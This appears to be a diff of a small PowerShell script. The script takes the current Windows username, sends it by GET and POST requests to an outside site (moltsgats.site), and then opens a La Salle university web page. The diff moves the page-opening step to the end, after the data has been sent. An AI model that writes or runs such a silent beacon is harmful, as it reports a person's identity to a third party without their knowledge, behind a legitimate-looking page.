@@ -1,5 +1,3 @@
-Start-Process "https://web.salleurl.edu/ph/"
-#
 $username = $env:USERNAME
 #
 $getUrl = "https://moltsgats.site/sendsal2025?$username"
@@ -10,3 +8,4 @@ $jsonPayload = @{
     username = $username
 } | ConvertTo-Json
 Invoke-RestMethod -Uri $postUrl -Method Post -Body $jsonPayload -ContentType "application/json"
+Start-Process "https://web.salleurl.edu/ph/"
